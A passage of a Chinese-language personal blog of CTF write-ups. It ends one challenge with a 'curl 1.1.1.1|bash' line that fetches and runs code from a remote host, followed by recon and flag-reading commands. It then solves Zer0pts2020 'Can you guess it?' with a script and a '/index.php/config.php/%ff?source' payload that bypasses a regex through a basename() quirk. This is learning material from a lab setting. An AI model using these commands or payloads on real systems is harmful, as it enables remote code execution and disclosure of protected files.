+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl 1.1.1.1|bash</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">id</span><br><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">还好这个题没让提权！</span><br><span class="line">提权我还真不会！</span><br><span class="line"></span><br><span class="line">find &#x2F; -name &quot;*flag*&quot;</span><br><span class="line">cat &#x2F;etc&#x2F;demo&#x2F;P3rh4ps&#x2F;love&#x2F;you&#x2F;flag</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h1><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210127154614.png" alt="image-20210126164739932"></p>
+<h2 id="PHP中-SERVER的详细参数与说明介绍"><a href="#PHP中-SERVER的详细参数与说明介绍" class="headerlink" title="PHP中$_SERVER的详细参数与说明介绍"></a>PHP中$_SERVER的详细参数与说明介绍</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u012222248/article/details/79816801">https://blog.csdn.net/u012222248/article/details/79816801</a></p>
+<p>int是4个字节</p>
+<p>1个字节是8位</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/bigapple88/article/details/5601295">bit、byte、位、字节、汉字的关系</a></p>
+<p>看了学到好多！</p>
+<p>跑远了！基础太差！🙄</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, $_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  $guess = (<span class="keyword">string</span>) $_POST[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $message = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Can you guess it?&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Can you guess it?&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;<span class="keyword">If</span> your guess is correct, I<span class="string">&#x27;ll give you the flag.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;hr&gt;</span></span><br><span class="line"><span class="string">&lt;?php if (isset($message)) &#123; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;?php &#125; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210127154615.png" alt="image-20210126180940457"></p>
+<p>可以发现$_SERVER[‘PHP_SELF’] <em>#当前正在执行脚本的文件名，与 document root相关。</em></p>
+<p>$_SERVER[‘PHP_SELF’] 把所有脚本名都返回回来了！</p>
+<p>basename — 返回路径中的文件名部分</p>
+<p>在加上basename 就会返回最后一个！</p>
+<p>那我们只要构造config.php！就可以得到flag！</p>
+<h2 id="正则表达式污染"><a href="#正则表达式污染" class="headerlink" title="正则表达式污染"></a>正则表达式污染</h2><p>大佬的正则表达式污染脚本：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, $str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">255</span>;$i++)&#123;</span><br><span class="line">    $str=<span class="string">&quot;/index.php/config.php/&quot;</span>.chr($i);</span><br><span class="line">    <span class="keyword">if</span>(!check($str))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $i.<span class="string">&quot;：&quot;</span>.basename($str);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>index.php/config.php/%ff?source</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210127154616.png" alt="image-20210126182241377"></p>
+<p>但是在测试的时候还是能匹配到！不知道为啥！！！😶</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210127154617.png" alt="image-20210126182304968"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210127154618.png" alt="image-20210126183306763"></p>
+<p>还有一点！污染后</p>
+<p>在basename函数里没有影响！</p>
+<p>从 <a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=62119">https://bugs.php.net/bug.php?id=62119</a> 找到了basename()函数的一个问题，</p>
+<p>它会去掉文件名开头的非ASCII值：</p>
+<p>其实ascil码只有127个，总共其实可以有256个！127个就够了！</p>
+<p>所以后面的都是各国自己设置的！看下面文章把：</p>
+<p><strong>basename函数所以应该是 它会去掉文件名开头的大于ASCII值为127：</strong></p>
+<h3 id="字符编码笔记：ASCII，Unicode-和-UTF-8"><a href="#字符编码笔记：ASCII，Unicode-和-UTF-8" class="headerlink" title="字符编码笔记：ASCII，Unicode 和 UTF-8"></a>字符编码笔记：ASCII，Unicode 和 UTF-8</h3><p><a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html">http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html</a></p>
+<p>如下：是大于ascii码127的！</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210127154619.png" alt="image-20210126183627342"></p>
+<p>下图是ascii码小于127范围内</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210127154620.png" alt="image-20210126184005392"></p>
+<p>总结：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">通过正则表达式污染绕过正则！</span><br><span class="line">再根据basename函数的性质！会去掉文件名开头的ASCII值大于127的值！来读取config.php</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">uploads</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://tanchiyu.top/2021/01/26/BUUCTF-17/">https://tanchiyu.top/2021/01/26/BUUCTF-17/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://tanchiyu.top" target="_blank">Tcy👦♥QQ👧</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/sql%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/">sql二次注入</a><a class="post-meta__tags" href="/tags/git%E6%B3%84%E9%9C%B2/">.git泄露</a><a class="post-meta__tags" href="/tags/swp%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/">swp信息泄露</a><a class="post-meta__tags" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%8F%8D%E5%BC%B9shell/">命令执行-反弹shell</a><a class="post-meta__tags" href="/tags/PHP%E4%B8%AD-SERVER%E7%9A%84%E8%AF%A6%E7%BB%86%E5%8F%82%E6%95%B0%E4%B8%8E%E8%AF%B4%E6%98%8E%E4%BB%8B%E7%BB%8D/">PHP中$_SERVER的详细参数与说明介绍</a><a class="post-meta__tags" href="/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B1%A1%E6%9F%93-basename%E5%87%BD%E6%95%B0%E7%89%B9%E6%80%A7/">正则表达式污染+basename函数特性</a></div><div class="post_share"><div class="social-share" data-image="/image/ttt.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/01/27/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"><img class="prev-cover" data-lazy-src="/image/ttt.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">汇编语言学习</div></div></a></div><div class="next-post pull-right"><a href="/2021/01/25/SSRF%E5%AD%A6%E4%B9%A0/"><img class="next-cover" data-lazy-src="/image/236.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">SSRF学习</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/01/27/BUUCTF-18/" title="BUUCTF18"><img class="cover" data-lazy-src="/image/ttt.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-27</div><div class="title">BUUCTF18</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" data-lazy-src="/image/pp.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">uploads</div><div class="author-info__description">每天都要开心</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">54</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">107</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://tcyba.github.io/"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/tcyba" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2384372932@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">我希望我以后每天都能开开心心！</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment"><span class="toc-number">1.</span> <span class="toc-text">[网鼎杯 2018]Comment</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.1.</span> <span class="toc-text">暴力破解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#git%E6%B3%84%E9%9C%B2"><span class="toc-number">1.2.</span> <span class="toc-text">.git泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text">二次注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#addslashes-%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.1.</span> <span class="toc-text">addslashes() 函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%EF%BC%9A"><span class="toc-number">1.3.2.</span> <span class="toc-text">payload：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#etc-passwd-%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%EF%BC%9A"><span class="toc-number">1.3.3.</span> <span class="toc-text">&#x2F;etc&#x2F;passwd 文件格式：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bash-history%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.4.</span> <span class="toc-text">.bash_history文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DS-Store-%E6%B3%84%E9%9C%B2"><span class="toc-number">1.3.5.</span> <span class="toc-text">.DS_Store 泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E8%AF%AD%E5%8F%A5%E6%B3%A8%E9%87%8A%E9%97%AE%E9%A2%98"><span class="toc-number">1.3.6.</span> <span class="toc-text">sql语句注释问题</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BJDCTF-2nd-Schro%CC%88dinger"><span class="toc-number">2.</span> <span class="toc-text">[BJDCTF 2nd]Schrödinger</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BJDCTF-2nd-duangShell"><span class="toc-number">3.</span> <span class="toc-text">[BJDCTF 2nd]duangShell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">3.1.</span> <span class="toc-text">信息泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">3.1.1.</span> <span class="toc-text">正则表达式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.2.</span> <span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">3.2.1.</span> <span class="toc-text">反弹shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Zer0pts2020-Can-you-guess-it"><span class="toc-number">4.</span> <span class="toc-text">[Zer0pts2020]Can you guess it?</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E4%B8%AD-SERVER%E7%9A%84%E8%AF%A6%E7%BB%86%E5%8F%82%E6%95%B0%E4%B8%8E%E8%AF%B4%E6%98%8E%E4%BB%8B%E7%BB%8D"><span class="toc-number">4.1.</span> <span class="toc-text">PHP中$_SERVER的详细参数与说明介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B1%A1%E6%9F%93"><span class="toc-number">4.2.</span> <span class="toc-text">正则表达式污染</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0%EF%BC%9AASCII%EF%BC%8CUnicode-%E5%92%8C-UTF-8"><span class="toc-number">4.2.1.</span> <span class="toc-text">字符编码笔记：ASCII，Unicode 和 UTF-8</span></a></li></ol></li></ol></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/02/06/hackme%E9%9D%B6%E5%9C%BA/" title="hackme靶场"><img data-lazy-src="/image/ttt.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hackme靶场"/></a><div class="content"><a class="title" href="/2021/02/06/hackme%E9%9D%B6%E5%9C%BA/" title="hackme靶场">hackme靶场</a><time datetime="2021-02-06T13:26:18.000Z" title="发表于 2021-02-06 21:26:18">2021-02-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/05/Pikachu%E9%9D%B6%E5%9C%BA/" title="Pikachu靶场"><img data-lazy-src="/image/ttt.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Pikachu靶场"/></a><div class="content"><a class="title" href="/2021/02/05/Pikachu%E9%9D%B6%E5%9C%BA/" title="Pikachu靶场">Pikachu靶场</a><time datetime="2021-02-05T06:35:59.000Z" title="发表于 2021-02-05 14:35:59">2021-02-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/05/%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/" title="工具学习"><img data-lazy-src="/image/ttt.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="工具学习"/></a><div class="content"><a class="title" href="/2021/02/05/%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/" title="工具学习">工具学习</a><time datetime="2021-02-05T03:48:26.000Z" title="发表于 2021-02-05 11:48:26">2021-02-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/02/BUUCTF-22/" title="无题"><img data-lazy-src="/image/ttt.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2021/02/02/BUUCTF-22/" title="无题">无题</a><time datetime="2021-02-02T03:00:17.000Z" title="发表于 2021-02-02 11:00:17">2021-02-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/01/BUUCTF-21/" title="BUUCTF21"><img data-lazy-src="/image/ttt.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUUCTF21"/></a><div class="content"><a class="title" href="/2021/02/01/BUUCTF-21/" title="BUUCTF21">BUUCTF21</a><time datetime="2021-02-01T06:14:07.000Z" title="发表于 2021-02-01 14:14:07">2021-02-01</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/2.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By uploads</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="rightside.chat_btn"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.spacingElementById('content-inner')
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.spacingElementById('content-inner')
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',()=> {preloader.endLoading()})</script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    loader: {
+      source: {
+        '[tex]/amsCd': '[tex]/amscd'
+      }
+    },
+    tex: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]],
+      tags: 'ams'
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, ''],
+        addClass: [200,() => {
+          document.querySelectorAll('mjx-container:not([display=\'true\']').forEach( node => {
+            const target = node.parentNode
+            if (!target.classList.contains('has-jax')) {
+              target.classList.add('mathjax-overflow')
+            }
+          })
+        }, '', false]
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typeset()
+}</script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.css"><script>(() => {
+  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
+    btf.wrap(item, 'div', '', 'katex-wrap')
+  })
+})()</script><script>if (document.getElementsByClassName('mermaid').length) {
+  if (window.mermaidJsLoad) mermaid.init()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(() => {
+      window.mermaidJsLoad = true
+      mermaid.initialize({
+        theme: 'neutral',
+      })
+      false && mermaid.init()
+    })
+  }
+}</script><script>function loadValine () {
+  function initValine () {
+    let initData = {
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      placeholder: 'Please leave your footprints',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'en',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+    }
+
+    if (true) { 
+      initData.requiredFields= ('nick,mail'.split(','))
+    }
+    
+    if (false) {
+      const otherData = false
+      initData = Object.assign({}, initData, otherData)
+    }
+    
+    const valine = new Valine(initData)
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.querySelector('#vcomment'),loadValine)
+  else setTimeout(() => loadValine(), 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'https://tanchiyu.top/2021/01/26/BUUCTF-17/'
+    this.page.identifier = '2021/01/26/BUUCTF-17/'
+    this.page.title = 'BUUCTF17'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://你的disqus的 short-name.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script>(function(d, w, c) {
+    w.ChatraID = '';
+    var s = d.createElement('script');
+    w[c] = w[c] || function() {
+        (w[c].q = w[c].q || []).push(arguments);
+    };
+    s.async = true;
+    s.src = 'https://call.chatra.io/chatra.js';
+    if (d.head) d.head.appendChild(s);
+})(document, window, 'Chatra');
+
+if (true) {
+  var chatBtnFn = () => {
+    var chatBtn = document.getElementById("chat_btn")
+    chatBtn.addEventListener("click", function(){
+      Chatra('openChat')
+    });
+  }
+  chatBtnFn()
+} else {
+  if (true) {
+    function chatBtnHide () {
+      Chatra('hide')
+    }
+    function chatBtnShow () {
+      Chatra('show')
+    }
+  }
+}</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
